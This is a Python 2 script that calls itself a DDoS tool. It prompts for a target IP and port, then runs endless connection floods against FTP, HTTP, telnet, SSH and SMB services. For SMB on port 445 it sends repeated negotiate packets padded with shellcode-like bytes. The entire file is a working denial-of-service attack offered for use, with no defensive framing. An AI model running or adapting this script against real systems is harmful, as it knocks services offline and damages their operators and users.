import socket
from ftplib import FTP
import httplib
from sys import exit
print "this tool is creat for make DDos for servers Ex : ftp http telnets "
d=1
x = "GET / HTTP/1.1\r\n"
z = "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:29.0) Gecko/20100101 Firefox/29.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n"
v = "\x00\x00\x00\xbe\xffSMBr\x00\x00\x00\x00\x08\x01\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+"\xb9`\x00\x00\x01\x00\x00\x9b\x00\x02PC NETWORK PROGRAM 1.0\x00\x02MICROSOFT NETWORKS 1.03\x00\x02MICROSOFT NETWORKS 3.0\x00\x02LANMAN1.0\x00\x02LM1.2X002\x00\x02DOS LANMAN2.1\x00\x02LANMAN2.1\x00\x02Samba\x00\x02NT LANMAN 1.0\x00\x02NT LM 0.12\x00"
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
a=raw_input("write the ip server MR.adel	 : ")
b=int(raw_input("write the port : "))
y = "Host: %s\r\n" % a
if b==21 :
    while 1 :
        d=d+1
        print "[*]Connect to (" + a +") port ",b
        print "[+] connecting FTP "
        ftp = FTP(a)
        ftp.quit()
        print "[*] connecting Num :" ,d
        s.connect((a,b))
        s.close()
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print "[*] connecting"
        s.connect((a,b))
        s.close()
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print "[+] connecting FTP "
        ftp = FTP(a)
        ftp.quit()
elif b==80 :
    while 1 :
        d=d+1
        print "[*]Connect to (" + a +") port ",b
        print "[+] connecting http "
        s.connect((a,b))
        s.send(x+y+z)
        s.close()
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print "[*] connecting"
        s.connect((a,b))
        s.send(x+y+z)
        s.close()
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print "[*] connecting Num : " , d
        s.connect((a,b))
        s.send(x+y+z)
        s.close()
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print "[+] connecting http "
        
elif b==23 :
    while 1 :
        d=d+1
        print "[*]Connect to (" + a +") port ",b
        s.connect((a,b))
        print "[+]Connecting Done!" 
        print "[*]Packege Num: ", d
        print "[+]Sending Packege " , s.send("******" +"""


""") ,"B,s"
        print "[+]Sending Packege " , s.send("*****" +"""


""") ,"B,s"
        s.close()
        s.close()
        print "[-]Connect Close"
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print "[*]Reconnect!"
elif b==445 :
    while 1 :
        d=d+1
        print "[*]Connect to (" + a +") port ",b
        s.connect((a,b))
        print "[+]Connecting Done!"
        print "[*]Packege Num: ", d
        print "[+]Sending Packege " , s.send(v) , "B,s"
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((a,b))
        print "[+]Sending Packege " , s.send(v) , "B,s"
        s.close()
        s.close()
        print "[-]Connect Close"
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print "[*]Reconnect!"
        print "[*]Connect to (" + a +") port ",b
        s.connect((a,b))
        print "[+]Connecting Done!"
        print "[*]Packege Num: ", d
        print "[+]Sending Packege " , s.send(v + "\xf2\xa5" + "\x90") , "B,s"
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((a,b))
        print "[+]Sending Packege " , s.send(v + "\x6a\x7f" + "\x59" + "\xf2\xa5" + "\x90") , "B,s"
        s.close()
        s.close()
        print "[-]Connect Close"
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print "[*]Reconnect!"
        print "[*]Connect to (" + a +") port ",b
        s.connect((a,b))
        print "[+]Connecting Done!"
        print "[*]Packege Num: ", d
        print "[+]Sending Packege " , s.send(v) , "B,s"
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((a,b))
        print "[+]Sending Packege " , s.send(v) , "B,s"
        s.close()
        s.close()
        print "[-]Connect Close"
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print "[*]Reconnect!"
        print "[*]Connect to (" + a +") port ",b
        s.connect((a,b))
        print "[+]Connecting Done!"
        print "[*]Packege Num: ", d
        print "[+]Sending Packege " , s.send(v) , "B,s"
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((a,b))
        print "[+]Sending Packege " , s.send(v) , "B,s"
        s.close()
        s.close()
        print "[-]Connect Close"
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print "[*]Reconnect!"
elif b==22 :
    while 1 :
        d=d+1
        print "[*]Connect to (" + a +") port ",b
        s.connect((a,b))
        print "[+]Connecting Done!" 
        print "[*]Packege Num: ", d
        print "[+]Sending Packege " , s.send("******" +"""


""") ,"B,s"
        print "[+]Sending Packege " , s.send("*****" +"""


""") ,"B,s"
        s.close()
        s.close()
        print "[-]Connect Close"
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print "[*]Reconnect!"
else :
    while 1 :
        d=d+1
        print "[*]Connect to (" + a +") port ",b
        s.connect((a,b))
        print "[+]Connecting Done!" 
        print "[*]Packege Num: ", d
        print "[+]Sending Packege " , s.send("\x90" +"""


"""*d) ,"B,s"
        print "[+]Sending Packege " , s.send("\x90" +"""


"""*d) ,"B,s"
        s.close()
        s.close()
        print "[-]Connect Close"
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        print "[*]Reconnect!"
